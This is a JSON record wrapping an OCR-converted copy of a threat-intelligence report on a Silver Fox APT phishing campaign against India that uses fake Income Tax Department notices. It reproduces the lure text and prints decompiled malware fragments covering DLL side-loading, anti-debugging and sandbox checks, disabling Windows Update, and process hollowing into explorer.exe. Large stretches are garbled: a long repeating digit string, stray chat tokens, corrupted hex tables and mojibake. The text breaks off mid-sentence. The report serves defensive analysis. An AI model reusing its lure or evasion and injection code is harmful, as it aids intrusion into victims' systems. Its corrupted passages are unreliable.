{"file_name": "fed9c11a-b86a-49a9-a9e2-24332f01a81c.md", "title": "Silver Fox Targeting India Using Tax Themed Phishing Lures", "malicious_code": "DeleteFileA(FileName);", "describe": "cloudsek.com/blog/silver- fox- targeting- india- using- tax- themed- phishing- lures  \n\nPrajwal Awasthi  \n\nTable of Content  \n\nSubscribe to CloudSEK Resources  \n\nGet the latest industry news, threats and resources.  \n\n## Executive Summary  \n\nCloudSEK's TRIAD discovered a campaign by Silver Fox APT targeting India with Income tax themed phishing lures. The lure is visually identical to the ones discovered by other vendors, however, this campaign has not been attributed to a specific threat actor before this report. Attribution accuracy is critical to threat intelligence; it enables defenders to predict adversary behavior and deploy targeted countermeasures. Misattribution from trusted sources propagates through threat feeds and detection systems, causing organizations to focus on the wrong threat while the actual adversary operates undetected. Attributing this campaign to SideWinder APT (India- aligned) contradicts basic victimology and creates systemic confusion. Using our report aims to highlight the sophisticated kill chain by the Chinese APT group, and explains the rationale behind CloudSEK's attribution.  \n\n## Kill Chain  \n\n<｜end▁of▁sentence｜>\n  \n\n## Initial Access Vector  \n\nTOPSOE INDIA PRIVATE LIMITED \n\n \n\nस्वरोचन ने अधिकार - Allgate/1/6/6/6/6/6/6/6/6/6/6/1/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/\n  \n\nMalicious email  \n\nWe found an interesting email uploaded from India with just an attachment called \"TOPsoE India Private Limited\". The pdf looked like an official Income Tax Department document. Upon clicking on the pdf, \"ggwk[.]cc\" opens up on the browser and a zip file called \"tax affairs.exe\" is downloaded.\n\n<--- Page Split --->\n\nNo. TAX/PEN/2025-142 \n\nभारत सरकार / Government of India\nवित्त मंत्रालय / Ministry of Finance\nआयकर विभाग / Income Tax Department\nप्रवर्तन प्रभाग / Enforcement Division \n\nAayakar Bhavan,\nNew Delhi - 110001 \n\nOFFICE MEMORANDUM \n\nSub: कर अनुपालन की कमी और दंड सूचना / Tax Compliance Deficiency and Penalty Notice \n\n1. आपकी कमनी की कर निरीक्षण के दौरान आयकर अधिनियम, 1961 की धारा 271(1)(c) के तहत कर संबंधी अनियमिताएं पाई गई हैं। The tax inspection of your company has revealed irregularities under Section 271(1)(c) of the Income Tax Act, 1961. \n\n2. इस सूचना की प्राप्ति के 72 घंटे (3 दिन) के भीतर निम्नलिखित दस्तावेज आयकर विभाग को प्रस्तुत करना अनिवार्य है। It is mandatory to submit the following documents to the Income Tax Department within 72 hours (3 days) of receipt of this notice. \n\nआवश्यक दस्तावेज सूची / Required Documents List\nनीचे दिए गए लिंक से दस्तावेज डाउनलोड करें / Download documents from the link below \n\nदस्तावेज डाउनलोड करें / Download Documents \n\n3. निर्धारित समयावधि में दस्तावेज प्रस्तुत न करने पर आयकर अधिनियम की धारा 276C के तहत कानूनी कार्रवाई की जाएगी। Legal action will be taken under Section 276C of the Income Tax Act if documents are not submitted within the stipulated time. \n\n(राज कुमार शर्मा) \n\nRaj Kumar Sharma \n\nसहायक आयकर आयुक्त \n\nAssistant Commissioner of Income Tax \n\nTechnical Analysis \n\nStage - 1: Tax Affairs.zip \n\nPE32 \n\nOperation system: Windows(2000)[1386, 32-bit, GUI] \n\nLinker: Microsoft Linker(10.00.40219) \n\nCompiler: Microsoft Visual C/C++(16.00.40219)[C] \n\nLanguage: C \n\nTool: Visual Studio(2010) \n\n(Heur) Packer: Compressed or packed data[Strange overlay] \n\nInstaller: Nullsoft Scriptable Install System(2.46.5-ANSI) \n\nOverlay: Binary[Offset=0x00034c00,Size=0x002a2e40] \n\nUnknown: Unknown \n\nDetect It Easy \n\nUsing static analysis we see that the given PE file is a 32 bit GUI binary. More importantly, the file is identified as a Nullsoft Scriptable Install system (NSIS) installer. NSIS installers embed their installation script, compressed payloads etc inside the binary itself and we can move ahead to analyse it as an installer driven staging payload.\n\n<--- Page Split --->\nGetTempPathA(0x10000u, PathName); \n\nif ( sub_4032CB() || (GetWindowsDirectoryA(PathName, 0xFFBu), lstrcatA(PathName, \"\\Temp\"), sub_4032CB()) \n\nDeleteFileA(FileName); \n\nError_writing_temporary_file._Make_sure_your_temp_folder_is_val = (const char *)sub_403030(Buffer); \n\nif (!Error_writing_temporary_file._Make_sure_your_temp_folder_is_val ) \n\nif (!dword_433C24 ) \n\n{ \n\nABEL_34: \n\nuExitCode = -1; \n\nuExitCode = sub_4052E6(); \n\ngoto LABEL_35; \n\n} \n\nfor ( i = (CHAR *)sub_40567B(&sz, 0); i >= &sz && sub_4032FF(i, \"_=\", 4); --i ) \n\n; \n\nError_writing_temporary_file._Make_sure_your_temp_folder_is_val = \"Error launching installer\"; \n\nif ( i >= &sz ) \n\n{ \n\n* i = 0; \n\nlpString2_3 = i + 4; \n\nif ( !sub_405EFC(lpString2_3) ) \n\ngoto LABEL_35; \n\nlstrcpyAn_wrp(&lpString1_, lpString2_3); \n\nlstrcpyAn_wrp(Directory, lpString2_3); \n\nError_writing_temporary_file._Make_sure_your_temp_folder_is_val = 0; \n\ngoto LABEL_34; \n\n} \n\nlstrcatA(PathName, \"\\nsu.tmp\"); \n\nif ( lstrcmpiA(PathName, ::lpString2) ) \n\n{ \n\nCreateDirectoryA(PathName, 0); \n\nSetCurrentDirectoryA(PathName); \n\nif ( !lpString1_ ) \n\nlstrcpyAn_wrp(&lpString1_, ::lpString2); \n\nlstrcpyAn_wrp(lpString1_, lpString2); \n\nlstrcpyAn_wrp(&lpString1_0, \"A\"); \n\nn26 = 26;<｜end▁of▁sentence｜>\n\n<center>NSIS Installer </center>  \n\nThe NSIS installer begins by resolving a writable temporary directory using GetTempPathA. If the operation fails, it falls back to C:\\Windows\\Temp, ensuring execution reliability. Once a valid location is identified, the installer creates an NSIS specific working directory (\\~nsu.tmp) and switches the directory to it.  \n\nDropped Files   \n\n<table><tr><td>ndoe &amp;gt; AppData &amp;gt; Local &amp;gt; Temp</td><td></td><td></td><td></td></tr><tr><td>Name</td><td>Date modified</td><td>Type</td><td>Size</td></tr><tr><td>Thunder.exe</td><td>7/24/2024 10:42 PM</td><td>Application</td><td>635 KB</td></tr><tr><td>FastAnimation.dll</td><td>5/27/2025 4:38 AM</td><td>Application extens...</td><td>578 KB</td></tr><tr><td>leakrepair.dll</td><td>5/27/2025 4:40 AM</td><td>Application extens...</td><td>716 KB</td></tr><tr><td>dynlbase.dll</td><td>5/27/2025 4:48 AM</td><td>Application extens...</td><td>1,431 KB</td></tr><tr><td>libaw.dat</td><td>5/27/2025 4:59 AM</td><td>DAT File</td><td>1,121 KB</td></tr><tr><td>DumpUper.ini</td><td>5/27/2025 5:01 AM</td><td>Configuration setti...</td><td>2 KB</td></tr><tr><td>libdefa.dat</td><td>9/16/2025 7:38 AM</td><td>DAT File</td><td>321 KB</td></tr><tr><td>box.ini</td><td>9/25/2025 8:00 PM</td><td>Configuration setti...</td><td>126 KB</td></tr><tr><td>libexpat.dll</td><td>9/25/2025 8:13 PM</td><td>Application extens...</td><td>32 KB</td></tr></table>  \n\nUpon analysis we found that only 2 files are of use to us, Thunder.exe and libexpat.dll. Thunder.exe is a legitimate, digitally signed executable developed by Xunlei (迅雷), commonly distributed as part of the Thunder download manager ecosystem. In this infection chain, the binary itself is not malicious but is abused as a DLL hijacking host. When executed from installer's temporary directory, Thunder.exe loads libexpat.dll from its local path due to default DLL search order. We can confirm this in x64dbg.\n\n<--- Page Split --->\npos: 0%\n\npush eax\n\njmp tax affairs.402008\n\npush F\n\ncall tax affairs.405A65\n\npush 64\n\npush dword ptr ss:[ebp+8]\n\ncall esi\n\ncmp eax,102\n\nje tax affairs.401FFC\n\nlea eax,dword ptr ss:[ebp-8]\n\npush eax\n\npush dword ptr ss:[ebp+8]\n\ncall dword ptr ds:[<GetExitCodeProcess>]\n\ncmp dword ptr ss:[ebp-20],ebx\n\njl tax affairs.40202E\n\npush dword ptr ss:[ebp-8]\n\npush edi\n\ncall tax affairs.40589E\n\njmp tax affairs.40203A\n\ncmp dword ptr ss:[ebp-8],ebx\n\nje tax affairs.40203A\n\nmov dword ptr ss:[ebp-4],1\n\npush dword ptr ss:[ebp+8]<｜end▁of▁sentence｜>\n\n<center>DLL Loading </center>  \n\n## Stage - 2 : libexpat.dll  \n\nThe dropped libexpat.dll does not export any meaningful functions and is never explicitly invoked by Thunder.exe.The dll relies on the windows loader functionality and calls the DLLMain. This callback is invoked unconditionally, regardless of whether the DLL exports any functions or is actively used by the host process.  \n\nLet's take a look at the working of the DLL.  \n\nv4 = IsDebuggerPresent(); \n\nv5 = &unk_100056DC; \n\nif (!v4) \n\nv5 = &unk_100056E4; \n\nLogStatus((char *)&Format_1, v5); \n\nif (v4) \n\n{ \n\nLogStatus((char *)&Format_2); \n\nreturn 0; \n\n} \n\nelse if (CheckSystemResources()) \n\nGetSystemInfo(&SystemInfo); \n\ndwNumberOfProcessors = SystemInfo.dwNumberOfProcessors; \n\nv7 = &unk_1000560C; \n\nif ( SystemInfo.dwNumberOfProcessors < 4 ) \n\nv7 = &unk_10005614; \n\nLogStatus(aCpu, SystemInfo.dwNumberOfProcessors, v7); \n\nif ( dwNumberOfProcessors >= 4 ) \n\n{ \n\nif (!(unsigned __int8)Persistence()) \n\nLogStatus((char *)&Format_3); \n\nToolHelp32Snapshot = CreateToolhelp32Snapshot(2u, 0); \n\nif ( ToolHelp32Snapshot != (HANDLE)-1 ) \n\n{ \n\npe.dwSize = 556; \n\nif ( Process32Firstw(Toolhelp32Snapshot, &pe) ) \n\n{ \n\ndo \n\n{ \n\nv9 = wcscmp(pe.szExeFile, L\"ida.exe\"); \n\nif ( v9 ) \n\nv9 = v9 < 0 ? -1 : 1; \n\nif (!v9 ) \n\nLogStatus((char *)&Format_4, pe.th32ProcessID); \n\nv10 = wcscmp(pe.szExeFile, L\"x64dbg.exe\"); \n\nif ( v10 ) \n\nv10 = v10 < 0 ? -1 : 1; \n\nif (!v10 ) \n\nLogStatus((char *)&Format_5, pe.th32ProcessID); \n\n} \n\nwhile ( Process32Nextw(Toolhelp32Snapshot, &pe) );<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\n\nThe Main function begins by many anti debugging and sandbox techniques.The DLL performs process enumeration and scans the process list for common analysis and sandbox tools. Also the DLL queries for the system resources checking if minimum requirements are satisfied or not. In addition to that, if it detects any sandbox environment, it terminates the malware.  \n\nif (!DisableWindowsUpdateService() ) \n\nLogStatus((char *)&Format_6); \n\nBlock[0] = 0; \n\nBlock[1] = 0; \n\nv17 = 0; \n\nv18 = 0; \n\nif ( LoadAndDecryptPayload(Block) ) \n\nv11 = ProcessHollowing((int)Block); \n\nFormat = (char *)&unk_100059C0; \n\nif ( v11 ) \n\nFormat = (char *)&byte_100059CC; \n\n} \n\nelse \n\n} \n\nFormat = (char *)&unk_100059E0; \n\n} \n\nLogStatus(Format); \n\nDisableThreadLibraryCalls(hinstDLL); \n\nCreateThread(0, 0, StartAddress, 0, 0, 0); \n\nv13 = Block[0]; \n\nif ( Block[0] ) \n\n} \n\nif ( v17 - (unsigned int)Block[0] >= 0x1000 ) \n\nv13 = (void *)*((_DWORD *)Block[0] - 1); \n\nif ( (unsigned int)((char *)Block[0] - (char *)v13 - 4) > 0x1F ) \n\ninvalid_parameter_noinfo_noreturn(); \n\n} \n\nsub_10003E6E(v13);<｜end▁of▁sentence｜>\n\n<center>Payload Decryption </center>  \n\nOnce the DLL completes its anti analysis checks, it enters the core execution logic. It first disables the Windows Update service(wuauserv) then loads an encrypted payload from the disk. The payload is dynamically resolved and loads the box.ini file from the temporary directory. The file is fully read into memory, decrypted using embedded cryptographic constants and later on executed as shellcode.  \n\n<table><tr><td>00</td><td>01</td><td>02</td><td>03</td><td>04</td><td>05</td><td>06</td><td>07</td><td>08</td><td>09</td><td>OA</td><td>OB</td><td>OC</td><td>OD</td><td>OE</td><td>OF</td></tr><tr><td>9B</td><td>80</td><td>9D</td><td>8E</td><td>89</td><td>C3</td><td>23</td><td>6B</td><td>A6</td><td>95</td><td>C5</td><td>FC</td><td>B7</td><td>2A</td><td>CB</td><td>OD</td></tr><tr><td>D4</td><td>CF</td><td>6B</td><td>FF</td><td>F8</td><td>6F</td><td>AC</td><td>9C</td><td>D8</td><td>94</td><td>6A</td><td>50</td><td>32</td><td>F0</td><td>B1</td><td>FC</td></tr><tr><td>E1</td><td>29</td><td>25</td><td>0D</td><td>5A</td><td>2A</td><td>E7</td><td>A3</td><td>4C</td><td>7B</td><td>54</td><td>A1</td><td>F7</td><td>2B</td><td>4E</td><td>60</td></tr><tr><td>14</td><td>CF</td><td>71</td><td>43</td><td>65</td><td>4B</td><td>B3</td><td>12</td><td>80</td><td>73</td><td>54</td><td>F5</td><td>A4</td><td>0B</td><td>ED</td><td>71</td></tr><tr><td>A6</td><td>6B</td><td>6B</td><td>5C</td><td>0D</td><td>6F</td><td>57</td><td>F0</td><td>F8</td><td>C3</td><td>F6</td><td>15</td><td>F2</td><td>8F</td><td>81</td><td>EB</td></tr><tr><td>6C</td><td>18</td><td>A0</td><td>F4</td><td>DB</td><td>9F</td><td>47</td><td>00</td><td>8C</td><td>A7</td><td>CE</td><td>0E</td><td>EB</td><td>92</td><td>CF</td><td>89</td></tr><tr><td>83</td><td>87</td><td>D0</td><td>70</td><td>D4</td><td>C9</td><td>42</td><td>64</td><td>BF</td><td>78</td><td>8D</td><td>C5</td><td>84</td><td>93</td><td>9B</td><td>90</td></tr><tr><td>74</td><td>BA</td><td>DE</td><td>B5</td><td>E8</td><td>A1</td><td>86</td><td>44</td><td>CC</td><td>AD</td><td>C3</td><td>C0</td><td>7C</td><td>A1</td><td>94</td><td>6F</td></tr><tr><td>54</td><td>62</td><td>72</td><td>F8</td><td>9F</td><td>6F</td><td>C4</td><td>R9</td><td>07</td><td>19</td><td>1D</td><td>F7</td><td>6F</td><td>17</td><td>DN</td><td>8F</td></tr></table>\n\nDecoded text \n\n\"E.ZNA#k!·Aü·*E.\nÖİkyoo-oeo\"jP2&tü\ná)%.Z*ç£L(Tj÷+N'\n.İqCeK°.eStÖn.iq\n!kk\\.ow&oAö.ö..ë\n1. öÜYG.ÇSİ.ë'İn\nf#DpÖÉBdžx.Ä„“>.\nt°Pue;tDİ.ÄÄ|;\"o\nThræšnÄi...-n.ÝÝ<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\nStartupInfo.dwFlags = STARTF_USESHOWWINDOW; \n\nmemset(&StartupInfo.wShowWindow, 0, 20); \n\nif ( GetFileAttributesA(\"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\") == -1 ) \n\nLastError = GetLastError(); \n\nLogStatus((char *)&Format_17, \"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\", LastError); return 0; \n\nif (!CreateProcessA( \n\n\"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\", \n\n0, \n\n0, \n\n0, \n\n0, \n\nCREATE_SUSPENDED | CREATE_NO_WINDOW, \n\n0, \n\n0, \n\n&StartupInfo, \n\n&ProcessInformation) ) \n\n{ \n\nerr = GetLastError(); \n\nLogStatus((char *)&Format_18, err, \"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\"); return 0; \n\nLogStatus((char *)&Format_19, ProcessInformation.dwProcessId, ProcessInformation.dwThreadId); Context.ContextFlags = 65543; \n\nif (!GetThreadContext(ProcessInformation.hThread, &Context) ) \n\nerr_1 = GetLastError(); \n\nLogStatus((char *)&Format_20, err_1); \n\nLABEL_7: \n\nCloseHandle(ProcessInformation.hThread); \n\nCloseHandle(ProcessInformation.hProcess);<｜end▁of▁sentence｜>\n\n<center>Process Injection </center>  \n\nThe 